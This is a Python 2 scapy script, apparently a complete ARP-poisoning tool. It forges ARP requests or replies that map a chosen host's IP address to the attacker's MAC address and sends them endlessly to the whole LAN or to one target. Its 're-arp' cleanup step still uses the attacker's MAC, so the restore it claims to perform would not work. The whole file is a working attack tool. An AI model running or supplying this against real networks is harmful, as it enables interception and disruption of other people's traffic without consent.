#!/usr/bin/env python
import os
import sys
import signal
import logging
from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Ether,
    sendp
)
from optparse import OptionParser
from time import sleep

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Gets rid of IPV6 Error when importing scapy


def main():
    if os.geteuid() != 0:
        print "[-] Run me as root"
        sys.exit(1)

    usage = 'Usage: %prog [-i interface] [-t target] host'
    parser = OptionParser(usage)
    parser.add_option('-i', dest='interface', help='Specify the interface to use')
    parser.add_option('-t', dest='target', help='Specify a particular host to ARP poison')
    parser.add_option('-m', dest='mode', default='req', help='Poisoning mode: requests (req) or replies (rep) [default: %default]')
    parser.add_option('-s', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
    (options, args) = parser.parse_args()

    if len(args) != 1 or options.interface is None:
        parser.print_help()
        sys.exit(0)

    mac = get_if_hwaddr(options.interface)

    def build_req():
        if options.target is None:
            pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args[0], pdst=args[0])
        elif options.target:
            target_mac = getmacbyip(options.target)
            if target_mac is None:
                print "[-] Error: Could not resolve targets MAC address"
                sys.exit(1)
            pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target)

        return pkt

    def build_rep():
        if options.target is None:
            pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args[0], op=2)
        elif options.target:
            target_mac = getmacbyip(options.target)
            if target_mac is None:
                print "[-] Error: Could not resolve targets MAC address"
                sys.exit(1)
            pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target, op=2)

        return pkt

    def rearp(signal, frame):
        sleep(1)
        print '\n[*] Re-arping network'
        rearp_mac = getmacbyip(args[0])
        pkt = Ether(src=rearp_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(psrc=args[0], hwsrc=mac, op=2)
        sendp(pkt, inter=1, count=5, iface=options.interface)
        sys.exit(0)

    signal.signal(signal.SIGINT, rearp)

    if options.mode == 'req':
        pkt = build_req()
    elif options.mode == 'rep':
        pkt = build_rep()

    if options.summary is True:
        pkt.show()
        ans = raw_input('\n[*] Continue? [Y|n]: ').lower()
        if ans == 'y' or len(ans) == 0:
            pass
        else:
            sys.exit(0)

    while True:
        sendp(pkt, inter=2, iface=options.interface)
